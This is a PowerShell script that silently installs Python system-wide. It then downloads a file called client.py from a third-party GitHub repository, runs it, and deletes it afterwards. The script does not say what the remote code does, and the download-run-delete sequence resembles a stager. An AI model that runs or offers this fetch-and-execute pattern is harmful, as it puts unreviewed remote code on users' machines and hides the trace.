# Define Python installer URL and temp path
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
$tempInstallerPath = "$env:TEMP\python-installer.exe"

# Download Python installer
Write-Host "Downloading Python installer..."
Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $tempInstallerPath

# Install Python silently for all users with PATH added
Write-Host "Installing Python..."
Start-Process -FilePath $tempInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

# Remove installer
Remove-Item $tempInstallerPath

# Verify python installation
Write-Host "Verifying Python installation..."
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

if (-not $pythonPath) {
    Write-Host "Python installation failed or Python is not in PATH."
    exit 1
}

Write-Host "Python installed successfully."

# Download the python script content
$scriptUrl = "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py"
$tempScriptPath = "$env:TEMP\client.py"

Write-Host "Downloading Python script..."
Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScriptPath

# Run the downloaded Python script
Write-Host "Running Python script..."
python $tempScriptPath

# Optionally remove the script after running
Remove-Item $tempScriptPath
